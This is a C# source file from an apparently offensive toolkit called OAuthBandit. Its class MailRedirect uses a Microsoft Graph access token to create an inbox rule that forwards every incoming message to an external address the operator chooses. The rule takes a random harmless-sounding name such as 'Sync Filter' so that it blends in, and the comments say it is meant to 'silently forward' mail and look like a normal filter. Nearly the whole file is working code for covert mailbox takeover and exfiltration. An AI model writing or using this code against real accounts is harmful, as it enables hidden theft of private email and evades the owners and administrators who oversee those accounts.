using System.Text.Json;

namespace OAuthBandit.Mfa;

// creates an inbox rule that silently forwards all mail to an external address
// uses /me/mailFolders/inbox/messageRules endpoint (needs Mail.ReadWrite)
public class MailRedirect
{
    private readonly GraphClient _graph;
    private static readonly Random _rng = new();

    // innocuous rule names to blend in
    private static readonly string[] RuleNames = {
        "Sync Filter", "Archive Rule", "Priority Sort",
        "Auto-categorize", "Read Receipt Handler", "Junk Override"
    };

    public MailRedirect(string accessToken)
    {
        _graph = new GraphClient(accessToken);
    }

    // check if we can access mail rules
    public bool CanAccessMailRules()
    {
        var (result, status, _, _) = _graph.GetDetailed("https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules");
        return status == 200;
    }

    // list existing rules to check if we already have one
    public List<string> ListExistingRules()
    {
        var rules = new List<string>();
        var result = _graph.Get("https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules?$select=displayName,isEnabled");
        if (result == null) return rules;

        if (result.Value.TryGetProperty("value", out var arr) && arr.ValueKind == JsonValueKind.Array)
        {
            foreach (var rule in arr.EnumerateArray())
            {
                var name = rule.TryGetProperty("displayName", out var dn) ? dn.GetString() : "unknown";
                var enabled = rule.TryGetProperty("isEnabled", out var en) && en.GetBoolean();
                rules.Add($"{name} (enabled={enabled})");
            }
        }
        return rules;
    }

    // create the forwarding rule - returns true on success
    public (bool success, string? ruleId, string? error) CreateForwardRule(string targetEmail)
    {
        var ruleName = RuleNames[_rng.Next(RuleNames.Length)];

        // inbox rule: forward everything to target, dont stop processing other rules
        // this way it looks like a normal filter
        var rulePayload = new Dictionary<string, object>
        {
            ["displayName"] = ruleName,
            ["sequence"] = 2,
            ["isEnabled"] = true,
            ["conditions"] = new Dictionary<string, object>(), // empty = match all
            ["actions"] = new Dictionary<string, object>
            {
                ["forwardTo"] = new[]
                {
                    new Dictionary<string, object>
                    {
                        ["emailAddress"] = new Dictionary<string, string>
                        {
                            ["address"] = targetEmail
                        }
                    }
                },
                ["stopProcessingRules"] = false
            }
        };

        var (result, status, errorCode, errorMsg) = _graph.Post(
            "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules",
            rulePayload
        );

        if (status >= 200 && status < 300)
        {
            string? ruleId = null;
            if (result != null && result.Value.TryGetProperty("id", out var id))
                ruleId = id.GetString();
            return (true, ruleId, null);
        }

        return (false, null, errorCode ?? errorMsg ?? $"HTTP {status}");
    }
}
